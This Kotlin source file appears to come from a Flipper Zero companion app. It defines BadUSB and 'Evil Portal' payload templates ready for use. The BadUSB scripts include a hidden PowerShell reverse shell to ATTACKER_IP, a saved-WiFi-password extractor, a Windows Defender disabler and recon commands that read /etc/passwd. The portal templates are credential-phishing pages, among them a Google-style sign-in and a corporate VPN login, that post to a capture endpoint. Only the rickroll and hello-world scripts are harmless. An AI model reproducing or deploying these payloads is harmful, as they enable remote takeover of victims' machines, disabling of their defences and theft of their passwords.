package com.vesper.flipper.domain.model

import kotlinx.serialization.SerialName
import kotlinx.serialization.Serializable

// PayloadType is defined in Alchemy.kt with full Flipper type support

/**
 * BadUSB script payload
 */
@Serializable
data class BadUsbPayload(
    val name: String,
    val description: String,
    val script: String,
    val category: BadUsbCategory = BadUsbCategory.CUSTOM,
    val platform: BadUsbPlatform = BadUsbPlatform.WINDOWS
)

@Serializable
enum class BadUsbCategory {
    @SerialName("prank") PRANK,
    @SerialName("recon") RECON,
    @SerialName("exfil") EXFIL,
    @SerialName("access") ACCESS,
    @SerialName("custom") CUSTOM
}

@Serializable
enum class BadUsbPlatform {
    @SerialName("windows") WINDOWS,
    @SerialName("macos") MACOS,
    @SerialName("linux") LINUX,
    @SerialName("cross_platform") CROSS_PLATFORM
}

/**
 * Evil Portal payload
 */
@Serializable
data class EvilPortalPayload(
    val name: String,
    val description: String,
    val html: String,
    val portalType: EvilPortalType = EvilPortalType.CUSTOM,
    @SerialName("capture_endpoint")
    val captureEndpoint: String = "/capture"
)

@Serializable
enum class EvilPortalType {
    @SerialName("wifi_login") WIFI_LOGIN,
    @SerialName("social_media") SOCIAL_MEDIA,
    @SerialName("corporate") CORPORATE,
    @SerialName("banking") BANKING,
    @SerialName("custom") CUSTOM
}

/**
 * Pre-built BadUSB templates
 */
object BadUsbTemplates {

    val rickroll = BadUsbPayload(
        name = "Rickroll",
        description = "Opens browser and plays Never Gonna Give You Up",
        category = BadUsbCategory.PRANK,
        platform = BadUsbPlatform.WINDOWS,
        script = """
REM Rickroll - Classic prank payload
REM Target: Windows
DELAY 1000
GUI r
DELAY 500
STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ
ENTER
        """.trimIndent()
    )

    val wifiGrabberWindows = BadUsbPayload(
        name = "WiFi Password Grabber",
        description = "Extracts saved WiFi passwords and displays them",
        category = BadUsbCategory.EXFIL,
        platform = BadUsbPlatform.WINDOWS,
        script = """
REM WiFi Password Extractor - Windows
REM Extracts all saved WiFi credentials
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING (netsh wlan show profiles) | Select-String ':(.+)$' | %{${'$'}name=${'$'}_.Matches.Groups[1].Value.Trim(); ${'$'}_} | %{(netsh wlan show profile name="${'$'}name" key=clear)} | Select-String 'Key Content\W+:(.+)$' | %{${'$'}pass=${'$'}_.Matches.Groups[1].Value.Trim(); ${'$'}_} | %{[PSCustomObject]@{SSID=${'$'}name;Password=${'$'}pass}} | Format-Table -AutoSize | Out-File "${'$'}env:USERPROFILE\Desktop\wifi_passwords.txt"
ENTER
DELAY 2000
STRING exit
ENTER
        """.trimIndent()
    )

    val systemInfoGrabber = BadUsbPayload(
        name = "System Info Grabber",
        description = "Collects system information and saves to desktop",
        category = BadUsbCategory.RECON,
        platform = BadUsbPlatform.WINDOWS,
        script = """
REM System Info Grabber - Windows
REM Collects comprehensive system information
DELAY 1000
GUI r
DELAY 500
STRING cmd /k
ENTER
DELAY 1000
STRING systeminfo > %USERPROFILE%\Desktop\sysinfo.txt && ipconfig /all >> %USERPROFILE%\Desktop\sysinfo.txt && netstat -an >> %USERPROFILE%\Desktop\sysinfo.txt && exit
ENTER
        """.trimIndent()
    )

    val reverseShellWindows = BadUsbPayload(
        name = "Reverse Shell",
        description = "PowerShell reverse shell (requires listener IP)",
        category = BadUsbCategory.ACCESS,
        platform = BadUsbPlatform.WINDOWS,
        script = """
REM Reverse Shell - Windows PowerShell
REM CHANGE IP AND PORT BEFORE USE!
REM Start listener: nc -lvnp 4444
DELAY 1000
GUI r
DELAY 500
STRING powershell -nop -w hidden -c "${'$'}client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);${'$'}stream = ${'$'}client.GetStream();[byte[]]${'$'}bytes = 0..65535|%{0};while((${ '$' }i = ${'$'}stream.Read(${ '$' }bytes, 0, ${ '$' }bytes.Length)) -ne 0){;${'$'}data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(${ '$' }bytes,0, ${ '$' }i);${'$'}sendback = (iex ${'$'}data 2>&1 | Out-String );${'$'}sendback2 = ${'$'}sendback + 'PS ' + (pwd).Path + '> ';${'$'}sendbyte = ([text.encoding]::ASCII).GetBytes(${ '$' }sendback2);${'$'}stream.Write(${ '$' }sendbyte,0,${ '$' }sendbyte.Length);${'$'}stream.Flush()};${'$'}client.Close()"
ENTER
        """.trimIndent()
    )

    val disableDefenderWindows = BadUsbPayload(
        name = "Disable Defender",
        description = "Temporarily disables Windows Defender (requires admin)",
        category = BadUsbCategory.ACCESS,
        platform = BadUsbPlatform.WINDOWS,
        script = """
REM Disable Windows Defender - Requires Admin
DELAY 1000
GUI r
DELAY 500
STRING powershell Start-Process powershell -Verb runAs
ENTER
DELAY 2000
ALT y
DELAY 1000
STRING Set-MpPreference -DisableRealtimeMonitoring ${'$'}true
ENTER
DELAY 500
STRING exit
ENTER
        """.trimIndent()
    )

    val helloWorldNotepad = BadUsbPayload(
        name = "Hello World",
        description = "Simple test - opens notepad and types message",
        category = BadUsbCategory.PRANK,
        platform = BadUsbPlatform.WINDOWS,
        script = """
REM Hello World - Simple test payload
DELAY 1000
GUI r
DELAY 500
STRING notepad
ENTER
DELAY 1000
STRING Hello from Flipper Zero!
STRING
STRING This BadUSB payload was generated by Vesper.
STRING Your Flipper is working correctly!
        """.trimIndent()
    )

    val macTerminal = BadUsbPayload(
        name = "Mac Terminal Command",
        description = "Opens terminal and runs a command on macOS",
        category = BadUsbCategory.RECON,
        platform = BadUsbPlatform.MACOS,
        script = """
REM macOS Terminal - System Info
DELAY 1000
GUI SPACE
DELAY 500
STRING terminal
DELAY 500
ENTER
DELAY 1000
STRING system_profiler SPSoftwareDataType SPHardwareDataType > ~/Desktop/sysinfo.txt && echo "Done!" && exit
ENTER
        """.trimIndent()
    )

    val linuxRecon = BadUsbPayload(
        name = "Linux Recon",
        description = "Basic reconnaissance on Linux systems",
        category = BadUsbCategory.RECON,
        platform = BadUsbPlatform.LINUX,
        script = """
REM Linux Reconnaissance
DELAY 1000
CTRL ALT t
DELAY 1000
STRING uname -a > /tmp/recon.txt && id >> /tmp/recon.txt && cat /etc/passwd >> /tmp/recon.txt && ifconfig >> /tmp/recon.txt && exit
ENTER
        """.trimIndent()
    )

    val allTemplates = listOf(
        rickroll,
        helloWorldNotepad,
        wifiGrabberWindows,
        systemInfoGrabber,
        reverseShellWindows,
        disableDefenderWindows,
        macTerminal,
        linuxRecon
    )
}

/**
 * Pre-built Evil Portal templates
 */
object EvilPortalTemplates {

    val genericWifiLogin = EvilPortalPayload(
        name = "Generic WiFi Login",
        description = "Simple captive portal WiFi login page",
        portalType = EvilPortalType.WIFI_LOGIN,
        html = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        body { min-height: 100vh; display: flex; align-items: center; justify-content: center; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
        .container { background: white; padding: 40px; border-radius: 16px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); width: 90%; max-width: 400px; }
        h1 { color: #333; margin-bottom: 8px; font-size: 24px; }
        p { color: #666; margin-bottom: 24px; font-size: 14px; }
        input { width: 100%; padding: 14px; margin-bottom: 16px; border: 2px solid #e1e1e1; border-radius: 8px; font-size: 16px; transition: border 0.2s; }
        input:focus { outline: none; border-color: #667eea; }
        button { width: 100%; padding: 14px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: transform 0.2s; }
        button:hover { transform: translateY(-2px); }
        .terms { font-size: 12px; color: #999; margin-top: 16px; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Free WiFi Access</h1>
        <p>Please sign in to continue browsing</p>
        <form action="/capture" method="POST">
            <input type="email" name="email" placeholder="Email address" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Connect to WiFi</button>
        </form>
        <p class="terms">By connecting, you agree to our Terms of Service</p>
    </div>
</body>
</html>
        """.trimIndent()
    )

    val googleLogin = EvilPortalPayload(
        name = "Google-style Login",
        description = "Login page styled like Google sign-in",
        portalType = EvilPortalType.SOCIAL_MEDIA,
        html = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Google Sans', Roboto, Arial, sans-serif; }
        body { min-height: 100vh; display: flex; align-items: center; justify-content: center; background: #f8f9fa; }
        .container { background: white; padding: 48px 40px; border-radius: 8px; border: 1px solid #dadce0; width: 90%; max-width: 450px; }
        .logo { text-align: center; margin-bottom: 16px; }
        .logo span { font-size: 24px; font-weight: 500; }
        .logo .g { color: #4285f4; } .logo .o1 { color: #ea4335; } .logo .o2 { color: #fbbc05; } .logo .g2 { color: #4285f4; } .logo .l { color: #34a853; } .logo .e { color: #ea4335; }
        h1 { text-align: center; font-weight: 400; font-size: 24px; margin-bottom: 8px; }
        .subtitle { text-align: center; color: #5f6368; margin-bottom: 32px; font-size: 16px; }
        input { width: 100%; padding: 13px 15px; margin-bottom: 24px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
        input:focus { outline: none; border: 2px solid #1a73e8; }
        .forgot { color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none; display: block; margin-bottom: 32px; }
        .buttons { display: flex; justify-content: space-between; align-items: center; }
        .create { color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none; }
        button { padding: 10px 24px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
        button:hover { background: #1557b0; box-shadow: 0 1px 3px rgba(0,0,0,0.2); }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span></div>
        <h1>Sign in</h1>
        <p class="subtitle">Use your Google Account</p>
        <form action="/capture" method="POST">
            <input type="email" name="email" placeholder="Email or phone" required>
            <input type="password" name="password" placeholder="Enter your password" required>
            <a href="#" class="forgot">Forgot password?</a>
            <div class="buttons">
                <a href="#" class="create">Create account</a>
                <button type="submit">Next</button>
            </div>
        </form>
    </div>
</body>
</html>
        """.trimIndent()
    )

    val corporateVpn = EvilPortalPayload(
        name = "Corporate VPN Login",
        description = "Enterprise VPN authentication portal",
        portalType = EvilPortalType.CORPORATE,
        html = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure VPN Access</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, sans-serif; }
        body { min-height: 100vh; display: flex; align-items: center; justify-content: center; background: #1a1a2e; }
        .container { background: #16213e; padding: 40px; border-radius: 8px; width: 90%; max-width: 420px; border: 1px solid #0f3460; }
        .header { text-align: center; margin-bottom: 32px; }
        .shield { font-size: 48px; margin-bottom: 16px; }
        h1 { color: #e94560; font-size: 20px; font-weight: 600; margin-bottom: 4px; }
        .subtitle { color: #a2a2a2; font-size: 14px; }
        label { display: block; color: #e1e1e1; font-size: 13px; margin-bottom: 6px; font-weight: 500; }
        input { width: 100%; padding: 12px 14px; margin-bottom: 20px; background: #0f3460; border: 1px solid #1a4080; border-radius: 4px; color: white; font-size: 15px; }
        input:focus { outline: none; border-color: #e94560; }
        input::placeholder { color: #6a6a8a; }
        button { width: 100%; padding: 14px; background: #e94560; color: white; border: none; border-radius: 4px; font-size: 15px; font-weight: 600; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; }
        button:hover { background: #ff6b6b; }
        .footer { text-align: center; margin-top: 24px; color: #6a6a8a; font-size: 12px; }
        .lock { margin-right: 6px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="shield">🛡️</div>
            <h1>CORPORATE VPN ACCESS</h1>
            <p class="subtitle">Secure Authentication Required</p>
        </div>
        <form action="/capture" method="POST">
            <label>USERNAME</label>
            <input type="text" name="username" placeholder="Enter your username" required>
            <label>PASSWORD</label>
            <input type="password" name="password" placeholder="Enter your password" required>
            <label>DOMAIN</label>
            <input type="text" name="domain" placeholder="CORP" value="CORP">
            <button type="submit"><span class="lock">🔒</span>AUTHENTICATE</button>
        </form>
        <p class="footer">Protected by Enterprise Security™</p>
    </div>
</body>
</html>
        """.trimIndent()
    )

    val hotelWifi = EvilPortalPayload(
        name = "Hotel WiFi Portal",
        description = "Hotel-style captive portal with room number",
        portalType = EvilPortalType.WIFI_LOGIN,
        html = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hotel WiFi</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Georgia, 'Times New Roman', serif; }
        body { min-height: 100vh; display: flex; align-items: center; justify-content: center; background: linear-gradient(to bottom, #2c3e50, #1a252f); }
        .container { background: white; padding: 50px 40px; border-radius: 4px; width: 90%; max-width: 440px; box-shadow: 0 10px 40px rgba(0,0,0,0.4); }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 { font-size: 28px; color: #c9a227; letter-spacing: 3px; font-weight: normal; }
        .logo .star { color: #c9a227; font-size: 12px; letter-spacing: 8px; }
        h2 { text-align: center; font-weight: normal; font-size: 18px; color: #333; margin-bottom: 8px; }
        .welcome { text-align: center; color: #777; margin-bottom: 30px; font-style: italic; font-size: 14px; }
        input { width: 100%; padding: 14px; margin-bottom: 16px; border: 1px solid #ddd; font-size: 15px; font-family: inherit; }
        input:focus { outline: none; border-color: #c9a227; }
        button { width: 100%; padding: 16px; background: #c9a227; color: white; border: none; font-size: 14px; letter-spacing: 2px; cursor: pointer; text-transform: uppercase; }
        button:hover { background: #b38b1d; }
        .footer { text-align: center; margin-top: 24px; font-size: 12px; color: #999; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <div class="star">★ ★ ★ ★ ★</div>
            <h1>GRAND HOTEL</h1>
        </div>
        <h2>Complimentary WiFi Access</h2>
        <p class="welcome">Welcome, valued guest</p>
        <form action="/capture" method="POST">
            <input type="text" name="room" placeholder="Room Number" required>
            <input type="text" name="lastname" placeholder="Last Name" required>
            <input type="email" name="email" placeholder="Email Address (optional)">
            <button type="submit">Connect to WiFi</button>
        </form>
        <p class="footer">By connecting you agree to our acceptable use policy</p>
    </div>
</body>
</html>
        """.trimIndent()
    )

    val allTemplates = listOf(
        genericWifiLogin,
        googleLogin,
        corporateVpn,
        hotelWifi
    )
}
